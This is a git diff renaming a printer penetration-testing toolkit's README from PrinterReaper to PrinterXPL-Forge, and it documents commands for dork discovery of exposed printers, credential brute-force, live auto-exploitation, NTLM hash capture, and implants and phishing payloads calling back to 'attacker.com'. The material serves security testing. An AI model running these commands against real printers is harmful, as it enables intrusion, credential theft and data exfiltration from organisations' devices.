@@ -1,6 +1,6 @@
 <div align="center">
 
-# PrinterReaper
+# PrinterXPL-Forge
 
 *Advanced Printer Penetration Testing Toolkit*
 
@@ -8,20 +8,20 @@
 
 [![Python](https://img.shields.io/badge/Python-3.8%2B-blue)](https://python.org)
 [![License](https://img.shields.io/badge/License-MIT-green)](LICENSE)
-[![GitHub](https://img.shields.io/badge/GitHub-mrhenrike-black?logo=github)](https://github.com/mrhenrike/PrinterReaper)
-[![Wiki](https://img.shields.io/badge/Wiki-English-orange)](https://github.com/mrhenrike/PrinterReaper/wiki)
-[![Wiki PT-BR](https://img.shields.io/badge/Wiki-Portugu%C3%AAs-green)](https://github.com/mrhenrike/PrinterReaper/wiki/Home-pt-BR)
-[![Version](https://img.shields.io/badge/version-3.14.0-red)](https://github.com/mrhenrike/PrinterReaper/releases)
+[![GitHub](https://img.shields.io/badge/GitHub-mrhenrike-black?logo=github)](https://github.com/mrhenrike/PrinterXPL-Forge)
+[![Wiki](https://img.shields.io/badge/Wiki-English-orange)](https://github.com/mrhenrike/PrinterXPL-Forge/wiki)
+[![Wiki PT-BR](https://img.shields.io/badge/Wiki-Portugu%C3%AAs-green)](https://github.com/mrhenrike/PrinterXPL-Forge/wiki/Home-pt-BR)
+[![Version](https://img.shields.io/badge/version-3.14.0-red)](https://github.com/mrhenrike/PrinterXPL-Forge/releases)
 
 > **"Is your printer safe from the void? Find out before someone else does."**
 
-**[Wiki (en-us)](https://github.com/mrhenrike/PrinterReaper/wiki)** · **[Wiki (pt-br)](https://github.com/mrhenrike/PrinterReaper/wiki/Home-pt-BR)** · **[Issues](https://github.com/mrhenrike/PrinterReaper/issues)** · **[Releases](https://github.com/mrhenrike/PrinterReaper/releases)** · **[CONTRIBUTING](CONTRIBUTING.md)** · **[CODE_OF_CONDUCT](CODE_OF_CONDUCT.md)** · **[README (pt-BR)](README.pt-BR.md)**
+**[Wiki (en-us)](https://github.com/mrhenrike/PrinterXPL-Forge/wiki)** · **[Wiki (pt-br)](https://github.com/mrhenrike/PrinterXPL-Forge/wiki/Home-pt-BR)** · **[Issues](https://github.com/mrhenrike/PrinterXPL-Forge/issues)** · **[Releases](https://github.com/mrhenrike/PrinterXPL-Forge/releases)** · **[CONTRIBUTING](CONTRIBUTING.md)** · **[CODE_OF_CONDUCT](CODE_OF_CONDUCT.md)** · **[README (pt-BR)](README.pt-BR.md)**
 
 </div>
 
 ---
 
-PrinterReaper is a complete, modular framework for security assessment of network printers. It covers all major printer languages (PJL, PostScript, PCL, ESC/P), all common protocols (RAW, IPP, LPD, SMB, HTTP, SNMP, FTP, Telnet), 39+ exploit modules, an external wordlist-driven credential engine with zero hardcoded passwords, ML-assisted fingerprinting, NVD/CVE integration, automated lateral movement, firmware analysis, and Cross-Site Printing payloads.
+PrinterXPL-Forge is a complete, modular framework for security assessment of network printers. It covers all major printer languages (PJL, PostScript, PCL, ESC/P), all common protocols (RAW, IPP, LPD, SMB, HTTP, SNMP, FTP, Telnet), 39+ exploit modules, an external wordlist-driven credential engine with zero hardcoded passwords, ML-assisted fingerprinting, NVD/CVE integration, automated lateral movement, firmware analysis, and Cross-Site Printing payloads.
 
 ---
 
@@ -33,9 +33,9 @@ PrinterReaper is a complete, modular framework for security assessment of networ
 
 ## Operational Workflow
 
-![PrinterReaper Workflow](img/printerreaper_workflow.png)
+![PrinterXPL-Forge Workflow](img/PrinterXPL-Forge_workflow.png)
 
-> Flow source files (editable in [draw.io](https://app.diagrams.net)): `diagrams/printerreaper_workflow.drawio` · `diagrams/credential_flow.drawio` · `diagrams/attack_matrix.drawio`
+> Flow source files (editable in [draw.io](https://app.diagrams.net)): `diagrams/PrinterXPL-Forge_workflow.drawio` · `diagrams/credential_flow.drawio` · `diagrams/attack_matrix.drawio`
 
 ---
 
@@ -51,11 +51,11 @@ PrinterReaper is a complete, modular framework for security assessment of networ
 
 ---
 
-## PrinterReaper vs PRET — Benchmark
+## PrinterXPL-Forge vs PRET — Benchmark
 
-[PRET](https://github.com/RUB-NDS/PRET) (Printer Exploitation Toolkit) is the reference tool from the BlackHat 2017 research by Müller et al. PrinterReaper was initially forked from it and has since been rewritten and massively extended.
+[PRET](https://github.com/RUB-NDS/PRET) (Printer Exploitation Toolkit) is the reference tool from the BlackHat 2017 research by Müller et al. PrinterXPL-Forge was initially forked from it and has since been rewritten and massively extended.
 
-| Feature | PRET | PrinterReaper v3.7.0 |
+| Feature | PRET | PrinterXPL-Forge v3.7.0 |
 |---------|------|----------------------|
 | **Languages** | PJL, PS, PCL | PJL, PS, PCL, ESC/P, auto |
 | **Protocols** | RAW, LPD, IPP, USB | RAW, LPD, IPP, SMB, HTTP, SNMP, FTP, Telnet |
@@ -81,23 +81,23 @@ PrinterReaper is a complete, modular framework for security assessment of networ
 | **SMB** | No | Yes (pysmb) |
 | **Wiki / Docs** | Basic README | Full GitHub wiki + draw.io diagrams |
 
-**Summary:** PrinterReaper covers the same core PJL/PS/PCL shell as PRET plus a complete post-exploitation, discovery, brute-force, CVE, and lateral movement framework on top.
+**Summary:** PrinterXPL-Forge covers the same core PJL/PS/PCL shell as PRET plus a complete post-exploitation, discovery, brute-force, CVE, and lateral movement framework on top.
 
 ---
 
 ## Installation
 
 ```bash
-git clone https://github.com/mrhenrike/PrinterReaper.git
-cd PrinterReaper
+git clone https://github.com/mrhenrike/PrinterXPL-Forge.git
+cd PrinterXPL-Forge
 
 python -m venv .venv
 source .venv/bin/activate        # Linux / macOS
 .venv\Scripts\activate           # Windows PowerShell
 
 pip install -r requirements.txt
-python printer-reaper.py --version
-# → printerreaper Version 3.7.0 (2026-03-25)
+python printerxpl-forge.py --version
+# → PrinterXPL-Forge Version 3.7.0 (2026-03-25)
 ```
 
 **Requirements:** Python 3.8+ · Windows / Linux / macOS · 80 MB disk
@@ -107,48 +107,48 @@ python printer-reaper.py --version
 ## Entry Point
 
 ```bash
-python printer-reaper.py [target] [mode] [options]
+python printerxpl-forge.py [target] [mode] [options]
 ```
 
 | Example | What it does |
 |---------|-------------|
-| `python printer-reaper.py` | Interactive guided menu |
-| `python printer-reaper.py --help` | Full flag reference |
-| `python printer-reaper.py 192.168.1.100 --scan` | Passive fingerprint + CVE scan |
-| `python printer-reaper.py 192.168.1.100 pjl` | PJL interactive shell |
-| `python printer-reaper.py 192.168.1.100 --bruteforce --bf-vendor epson` | Credential brute-force |
-| `python printer-reaper.py 192.168.1.100 --auto-exploit` | Auto exploit selection + execution |
-| `python printer-reaper.py 192.168.1.100 --attack-matrix` | Full attack campaign |
-| `python printer-reaper.py --discover-online --shodan --dork-vendor hp --dork-country BR` | Dork discovery via Shodan only |
-| `python printer-reaper.py --discover-online --dork-engine shodan,netlas --dork-vendor hp,epson --dork-country BR,AR` | Multi-engine, multi-vendor CSV |
-| `python printer-reaper.py --discover-online --dork-vendor hp --dork-country BR` | Dork discovery via all configured engines |
+| `python printerxpl-forge.py` | Interactive guided menu |
+| `python printerxpl-forge.py --help` | Full flag reference |
+| `python printerxpl-forge.py 192.168.1.100 --scan` | Passive fingerprint + CVE scan |
+| `python printerxpl-forge.py 192.168.1.100 pjl` | PJL interactive shell |
+| `python printerxpl-forge.py 192.168.1.100 --bruteforce --bf-vendor epson` | Credential brute-force |
+| `python printerxpl-forge.py 192.168.1.100 --auto-exploit` | Auto exploit selection + execution |
+| `python printerxpl-forge.py 192.168.1.100 --attack-matrix` | Full attack campaign |
+| `python printerxpl-forge.py --discover-online --shodan --dork-vendor hp --dork-country BR` | Dork discovery via Shodan only |
+| `python printerxpl-forge.py --discover-online --dork-engine shodan,netlas --dork-vendor hp,epson --dork-country BR,AR` | Multi-engine, multi-vendor CSV |
+| `python printerxpl-forge.py --discover-online --dork-vendor hp --dork-country BR` | Dork discovery via all configured engines |
 
 ---
 
 ## Custom Port Overrides
 
-By default PrinterReaper uses standard printer port numbers for each protocol. When the target printer listens on non-standard ports, override them globally via CLI flags — all modules automatically pick up the new ports:
+By default PrinterXPL-Forge uses standard printer port numbers for each protocol. When the target printer listens on non-standard ports, override them globally via CLI flags — all modules automatically pick up the new ports:
 
 ```bash
 # Printer with RAW on 3910 instead of 9100
-python printer-reaper.py 192.168.1.100 pjl --port-raw 3910
+python printerxpl-forge.py 192.168.1.100 pjl --port-raw 3910
 
 # Full scan on a printer with non-standard ports
-python printer-reaper.py 192.168.1.100 --scan \
+python printerxpl-forge.py 192.168.1.100 --scan \
   --port-raw 3910 \
   --port-ipp 8631 \
   --port-snmp 1161
 
 # Add extra ports to banner scan sweep
-python printer-reaper.py 192.168.1.100 --scan \
+python printerxpl-forge.py 192.168.1.100 --scan \
   --extra-ports 9200 --extra-ports 7100
 
 # Brute-force with custom HTTP and FTP ports
-python printer-reaper.py 192.168.1.100 --bruteforce \
+python printerxpl-forge.py 192.168.1.100 --bruteforce \
   --port-http 8080 --port-ftp 2121 --port-telnet 2323
 
 # Attack campaign respects all overrides
-python printer-reaper.py 192.168.1.100 --attack-matrix --port-raw 3910
+python printerxpl-forge.py 192.168.1.100 --attack-matrix --port-raw 3910
 ```
 
 **Port override flags:**
@@ -176,13 +176,13 @@ Overrides are applied globally at startup — every module (banner scan, PJL, fi
 
 ```bash
 # SNMP sweep + installed printers on this host
-python printer-reaper.py --discover-local
+python printerxpl-forge.py --discover-local
 
 # Passive OSINT check for a specific IP
-python printer-reaper.py 192.168.1.100 --osint
+python printerxpl-forge.py 192.168.1.100 --osint
 
 # Detect supported languages without connecting
-python printer-reaper.py 192.168.1.100 --auto-detect
+python printerxpl-forge.py 192.168.1.100 --auto-detect
 ```
 
 ### Online — Structured Dork Discovery (v3.12.0+)
@@ -194,38 +194,38 @@ python printer-reaper.py 192.168.1.100 --auto-detect
 
 ```bash
 # All Epson + Ricoh printers in Latin America, port 515 — all engines
-python printer-reaper.py --discover-online \
+python printerxpl-forge.py --discover-online \
   --dork-vendor epson,ricoh \
   --dork-region latin_america \
   --dork-port 515
 
 # HP DeskJet Pro 5500 in Brazil — Shodan only (single engine flag)
-python printer-reaper.py --discover-online --shodan \
+python printerxpl-forge.py --discover-online --shodan \
   --dork-vendor hp \
   --dork-model "deskjet pro 5500" \
   --dork-country BR
 
 # All printers in São Paulo port 9100 (CSV + single-country city filter)
-python printer-reaper.py --discover-online \
+python printerxpl-forge.py --discover-online \
   --dork-country BR \
   --dork-city "Sao Paulo","Rio de Janeiro" \
   --dork-port 9100
 
 # Kyocera in Europe, 200 results — Netlas only
-python printer-reaper.py --discover-online --netlas \
+python printerxpl-forge.py --discover-online --netlas \
   --dork-vendor kyocera \
   --dork-region europe \
   --dork-limit 200
 
 # Multiple vendors and countries via CSV — Shodan + ZoomEye (multi-engine)
-python printer-reaper.py --discover-online \
+python printerxpl-forge.py --discover-online \
   --dork-engine shodan,zoomeye \
   --dork-vendor hp,canon \
   --dork-country BR,AR \
   --dork-port 9100,631
 
 # Five engines at once
-python printer-reaper.py --discover-online \
+python printerxpl-forge.py --discover-online \
   --dork-engine shodan,censys,fofa,zoomeye,netlas \
   --dork-vendor epson --dork-port 9100
 ```
@@ -269,19 +269,19 @@ python printer-reaper.py --discover-online \
 
 ```bash
 # Full passive scan: banner grab + CVE/NVD lookup + exploit matching
-python printer-reaper.py 192.168.1.100 --scan
+python printerxpl-forge.py 192.168.1.100 --scan
 
 # Same + ML fingerprinting and attack scoring
-python printer-reaper.py 192.168.1.100 --scan-ml
+python printerxpl-forge.py 192.168.1.100 --scan-ml
 
 # Offline (skip NVD API)
-python printer-reaper.py 192.168.1.100 --scan --no-nvd
+python printerxpl-forge.py 192.168.1.100 --scan --no-nvd
 
 # Scan + immediately match exploit modules
-python printer-reaper.py 192.168.1.100 --scan --xpl
+python printerxpl-forge.py 192.168.1.100 --scan --xpl
 
 # Combined: scan auto-populates vendor + serial for bruteforce
-python printer-reaper.py 192.168.1.100 --scan --bruteforce
+python printerxpl-forge.py 192.168.1.100 --scan --bruteforce
 ```
 
 ---
@@ -290,16 +290,16 @@ python printer-reaper.py 192.168.1.100 --scan --bruteforce
 
 ```bash
 # Auto-detect best language
-python printer-reaper.py 192.168.1.100 auto
+python printerxpl-forge.py 192.168.1.100 auto
 
 # Specific languages
-python printer-reaper.py 192.168.1.100 pjl       # PJL: filesystem, NVRAM, control
-python printer-reaper.py 192.168.1.100 ps        # PostScript: operators, job capture
-python printer-reaper.py 192.168.1.100 pcl       # PCL: macro filesystem
+python printerxpl-forge.py 192.168.1.100 pjl       # PJL: filesystem, NVRAM, control
+python printerxpl-forge.py 192.168.1.100 ps        # PostScript: operators, job capture
+python printerxpl-forge.py 192.168.1.100 pcl       # PCL: macro filesystem
 
 # Debug, batch, log modes
-python printer-reaper.py 192.168.1.100 pjl --debug
-python printer-reaper.py 192.168.1.100 pjl -i commands.txt -o session.log -q
+python printerxpl-forge.py 192.168.1.100 pjl --debug
+python printerxpl-forge.py 192.168.1.100 pjl -i commands.txt -o session.log -q
 ```
 
 **Key PJL commands:**
@@ -323,24 +323,24 @@ Automatic exploit selection, verification, parameter pre-filling, and execution.
 
 ```bash
 # Auto exploit (dry-run — safe)
-python printer-reaper.py 192.168.1.100 --auto-exploit
+python printerxpl-forge.py 192.168.1.100 --auto-exploit
 
 # With serial number pre-filled to exploits that require it
-python printer-reaper.py 192.168.1.100 --auto-exploit --bf-serial XAABT77481
+python printerxpl-forge.py 192.168.1.100 --auto-exploit --bf-serial XAABT77481
 
 # Live exploitation — AUTHORIZED LABS ONLY
-python printer-reaper.py 192.168.1.100 --auto-exploit --no-dry
+python printerxpl-forge.py 192.168.1.100 --auto-exploit --no-dry
 
 # Restrict to a specific source
-python printer-reaper.py 192.168.1.100 --auto-exploit --xpl-source exploit-db
+python printerxpl-forge.py 192.168.1.100 --auto-exploit --xpl-source exploit-db
 
 # Check more candidates, run top 3
-python printer-reaper.py 192.168.1.100 --auto-exploit \
+python printerxpl-forge.py 192.168.1.100 --auto-exploit \
   --auto-exploit-limit 15 \
   --auto-exploit-run 3
 
 # Force a custom exploit file (parameters auto-filled)
-python printer-reaper.py 192.168.1.100 --auto-exploit \
+python printerxpl-forge.py 192.168.1.100 --auto-exploit \
   --auto-exploit-file /path/to/my_exploit.py \
   --bf-serial XAABT77481
 ```
@@ -360,22 +360,22 @@ python printer-reaper.py 192.168.1.100 --auto-exploit \
 
 ```bash
 # Auto-detect vendor, use default wordlist
-python printer-reaper.py 192.168.1.100 --bruteforce
+python printerxpl-forge.py 192.168.1.100 --bruteforce
 
 # Explicit vendor + serial (Epson / HP / Canon)
-python printer-reaper.py 192.168.1.100 --bruteforce --bf-vendor epson --bf-serial XAABT77481
+python printerxpl-forge.py 192.168.1.100 --bruteforce --bf-vendor epson --bf-serial XAABT77481
 
 # MAC-based tokens (OKI, Brother, Kyocera KR2)
-python printer-reaper.py 192.168.1.100 --bruteforce --bf-vendor oki --bf-mac AA:BB:CC:DD:EE:FF
+python printerxpl-forge.py 192.168.1.100 --bruteforce --bf-vendor oki --bf-mac AA:BB:CC:DD:EE:FF
 
 # Custom wordlist (replaces default)
-python printer-reaper.py 192.168.1.100 --bruteforce --bf-wordlist /path/to/creds.txt
+python printerxpl-forge.py 192.168.1.100 --bruteforce --bf-wordlist /path/to/creds.txt
 
 # Add individual credentials (highest priority)
-python printer-reaper.py 192.168.1.100 --bruteforce --bf-cred admin:MyPass --bf-cred root:
+python printerxpl-forge.py 192.168.1.100 --bruteforce --bf-cred admin:MyPass --bf-cred root:
 
 # No variation engine (faster)
-python printer-reaper.py 192.168.1.100 --bruteforce --bf-no-variations --bf-delay 2.0
+python printerxpl-forge.py 192.168.1.100 --bruteforce --bf-no-variations --bf-delay 2.0
 ```
 
 **Protocols tested:** HTTP/HTTPS · FTP · SNMP community strings · Telnet
@@ -397,22 +397,22 @@ admin:hpinvent!
 
 ```bash
 # List all 39+ modules sorted by CVSS
-python printer-reaper.py 192.168.1.100 --xpl-list
-python printer-reaper.py 192.168.1.100 --xpl-list --xpl-source exploit-db
+python printerxpl-forge.py 192.168.1.100 --xpl-list
+python printerxpl-forge.py 192.168.1.100 --xpl-list --xpl-source exploit-db
 
 # Non-destructive vulnerability check
-python printer-reaper.py 192.168.1.100 --xpl-check edb-35151
-python printer-reaper.py 192.168.1.100 --xpl-check edb-cve-2024-51978
+python printerxpl-forge.py 192.168.1.100 --xpl-check edb-35151
+python printerxpl-forge.py 192.168.1.100 --xpl-check edb-cve-2024-51978
 
 # Run exploit (dry-run default)
-python printer-reaper.py 192.168.1.100 --xpl-run edb-35151
-python printer-reaper.py 192.168.1.100 --xpl-run edb-35151 --no-dry  # live
+python printerxpl-forge.py 192.168.1.100 --xpl-run edb-35151
+python printerxpl-forge.py 192.168.1.100 --xpl-run edb-35151 --no-dry  # live
 
 # Download exploit from ExploitDB
-python printer-reaper.py --xpl-fetch 45273
+python printerxpl-forge.py --xpl-fetch 45273
 
 # Rebuild index after adding modules
-python printer-reaper.py --xpl-update
+python printerxpl-forge.py --xpl-update
 ```
 
 ---
@@ -423,13 +423,13 @@ Runs every attack category from BlackHat 2017 + 2024-2025 CVEs:
 
 ```bash
 # Dry-run (probe only)
-python printer-reaper.py 192.168.1.100 --attack-matrix
+python printerxpl-forge.py 192.168.1.100 --attack-matrix
 
 # Live exploitation — AUTHORIZED LABS ONLY
-python printer-reaper.py 192.168.1.100 --attack-matrix --no-dry
+python printerxpl-forge.py 192.168.1.100 --attack-matrix --no-dry
 
 # Combined with network map
-python printer-reaper.py 192.168.1.100 --attack-matrix --network-map --no-dry
+python printerxpl-forge.py 192.168.1.100 --attack-matrix --network-map --no-dry
 ```
 
 **Categories:** DoS · Protection Bypass · Job Manipulation · Information Disclosure · CORS/XSP · SNMP write · Network pivoting
@@ -440,16 +440,16 @@ python printer-reaper.py 192.168.1.100 --attack-matrix --network-map --no-dry
 
 ```bash
 # SSRF audit via IPP/WSD
-python printer-reaper.py 192.168.1.100 --pivot
+python printerxpl-forge.py 192.168.1.100 --pivot
 
 # Port-scan internal host via printer SSRF
-python printer-reaper.py 192.168.1.100 --pivot-scan 10.0.0.1
+python printerxpl-forge.py 192.168.1.100 --pivot-scan 10.0.0.1
 
 # Full network map from printer's perspective
-python printer-reaper.py 192.168.1.100 --network-map
+python printerxpl-forge.py 192.168.1.100 --network-map
 
 # LDAP NTLM hash capture
-python printer-reaper.py 192.168.1.100 --xpl-run research-ldap-hash-capture --no-dry
+python printerxpl-forge.py 192.168.1.100 --xpl-run research-ldap-hash-capture --no-dry
 ```
 
 ---
@@ -458,23 +458,23 @@ python printer-reaper.py 192.168.1.100 --xpl-run research-ldap-hash-capture --no
 
 ```bash
 # Storage audit: FTP, web file manager, SNMP MIB, saved jobs
-python printer-reaper.py 192.168.1.100 --storage
+python printerxpl-forge.py 192.168.1.100 --storage
 
 # Firmware: version, upload endpoint check, NVRAM probe
-python printer-reaper.py 192.168.1.100 --firmware
+python printerxpl-forge.py 192.168.1.100 --firmware
 
 # Factory reset (dry-run probes endpoints)
-python printer-reaper.py 192.168.1.100 --firmware-reset pjl
-python printer-reaper.py 192.168.1.100 --firmware-reset web
+python printerxpl-forge.py 192.168.1.100 --firmware-reset pjl
+python printerxpl-forge.py 192.168.1.100 --firmware-reset web
 
 # Persistent config implant
-python printer-reaper.py 192.168.1.100 --implant smtp_host=attacker.com
-python printer-reaper.py 192.168.1.100 --implant snmp_community=hacked
+python printerxpl-forge.py 192.168.1.100 --implant smtp_host=attacker.com
+python printerxpl-forge.py 192.168.1.100 --implant snmp_community=hacked
 
 # Language-specific payload injection
-python printer-reaper.py 192.168.1.100 --payload pjl:reset
-python printer-reaper.py 192.168.1.100 --payload ps:loop
-python printer-reaper.py 192.168.1.100 --payload ps:custom --payload-data "statusdict begin showROMfonts end"
+python printerxpl-forge.py 192.168.1.100 --payload pjl:reset
+python printerxpl-forge.py 192.168.1.100 --payload ps:loop
+python printerxpl-forge.py 192.168.1.100 --payload ps:custom --payload-data "statusdict begin showROMfonts end"
 ```
 
 ---
@@ -483,11 +483,11 @@ python printer-reaper.py 192.168.1.100 --payload ps:custom --payload-data "statu
 
 ```bash
 # Generate attack payloads (deployed via phishing / watering hole)
-python printer-reaper.py 192.168.1.100 --xsp info
-python printer-reaper.py 192.168.1.100 --xsp capture --xsp-callback https://attacker.com/log
-python printer-reaper.py 192.168.1.100 --xsp dos
-python printer-reaper.py 192.168.1.100 --xsp nvram
-python printer-reaper.py 192.168.1.100 --xsp exfil
+python printerxpl-forge.py 192.168.1.100 --xsp info
+python printerxpl-forge.py 192.168.1.100 --xsp capture --xsp-callback https://attacker.com/log
+python printerxpl-forge.py 192.168.1.100 --xsp dos
+python printerxpl-forge.py 192.168.1.100 --xsp nvram
+python printerxpl-forge.py 192.168.1.100 --xsp exfil
 ```
 
 ---
@@ -496,16 +496,16 @@ python printer-reaper.py 192.168.1.100 --xsp exfil
 
 ```bash
 # Full IPP security audit
-python printer-reaper.py 192.168.1.100 --ipp
+python printerxpl-forge.py 192.168.1.100 --ipp
 
 # Submit anonymous print job (dry-run)
-python printer-reaper.py 192.168.1.100 --ipp-submit
-python printer-reaper.py 192.168.1.100 --ipp-submit --no-dry
+python printerxpl-forge.py 192.168.1.100 --ipp-submit
+python printerxpl-forge.py 192.168.1.100 --ipp-submit --no-dry
 
 # Send any file to printer
-python printer-reaper.py 192.168.1.100 --send-job document.pdf
-python printer-reaper.py 192.168.1.100 --send-job payload.ps --send-proto raw
-python printer-reaper.py 192.168.1.100 --send-job flyer.pdf --send-copies 10 --send-proto lpd
+python printerxpl-forge.py 192.168.1.100 --send-job document.pdf
+python printerxpl-forge.py 192.168.1.100 --send-job payload.ps --send-proto raw
+python printerxpl-forge.py 192.168.1.100 --send-job flyer.pdf --send-copies 10 --send-proto lpd
 ```
 
 ---
@@ -618,7 +618,7 @@ Epson · HP · Brother · Ricoh · Xerox · Canon · Kyocera · Samsung · OKI �
 
 ```bash
 cp config.json.example config.json
-python printer-reaper.py --check-config
+python printerxpl-forge.py --check-config
 ```
 
 ---
@@ -629,7 +629,7 @@ All flow diagrams are editable in [diagrams.net / draw.io](https://app.diagrams.
 
 | File | Description |
 |------|-------------|
-| `diagrams/printerreaper_workflow.drawio` | 6-phase operational workflow |
+| `diagrams/PrinterXPL-Forge_workflow.drawio` | 6-phase operational workflow |
 | `diagrams/credential_flow.drawio` | Credential architecture flow |
 | `diagrams/attack_matrix.drawio` | Attack coverage matrix |
 | `diagrams/*.mmd` | Mermaid source diagrams |
@@ -644,7 +644,7 @@ Todo o empacotamento operacional foi centralizado em `packages/`:
 |------|----------|-------------------|
 | `packages/01-pypi/` | Wheel/sdist + publicação PyPI | `build.sh` / `build.ps1` |
 | `packages/02-deb/` | Pacote `.deb` (Debian/Ubuntu/Kali) | `prepare.sh` + `build.sh` |
-| `packages/03-rpm/` | Pacote `.rpm` (RHEL/Fedora/Rocky) | `build.sh` + `printer-reaper.spec` |
+| `packages/03-rpm/` | Pacote `.rpm` (RHEL/Fedora/Rocky) | `build.sh` + `printerxpl-forge.spec` |
 | `packages/04-pipx/` | Instalação isolada via `pipx` | `validate.sh` / `validate.ps1` |
 
 Fluxo recomendado:
@@ -699,7 +699,7 @@ Guia central: `packages/README.md`
 
 <!-- LEGAL-NOTICE-UG-MRH -->
 
-PrinterReaper is developed for **authorized security research, penetration testing, and educational purposes only**. Using this tool against systems you do not own or have explicit written authorization to test is **illegal**.
+PrinterXPL-Forge is developed for **authorized security research, penetration testing, and educational purposes only**. Using this tool against systems you do not own or have explicit written authorization to test is **illegal**.
 
 The software is provided **“as is” (AS IS)** under the [MIT License](LICENSE), **without warranty** of any kind (express or implied). The author is **not liable** for damages, misuse, third-party claims, or commercial/fitness guarantees — **use at your own risk**. Preserve **copyright notices** when redistributing; **pull requests** and **issues** are welcome.
 
@@ -707,10 +707,10 @@ The software is provided **“as is” (AS IS)** under the [MIT License](LICENSE
 
 <div align="center">
 
-**PrinterReaper** · *Advanced Printer Penetration Testing Toolkit*
+**PrinterXPL-Forge** · *Advanced Printer Penetration Testing Toolkit*
 
 Made with care for the security community.
 
-[Documentation](https://github.com/mrhenrike/PrinterReaper/wiki) | [Issues](https://github.com/mrhenrike/PrinterReaper/issues) | [Releases](https://github.com/mrhenrike/PrinterReaper/releases)
+[Documentation](https://github.com/mrhenrike/PrinterXPL-Forge/wiki) | [Issues](https://github.com/mrhenrike/PrinterXPL-Forge/issues) | [Releases](https://github.com/mrhenrike/PrinterXPL-Forge/releases)
 
 </div>
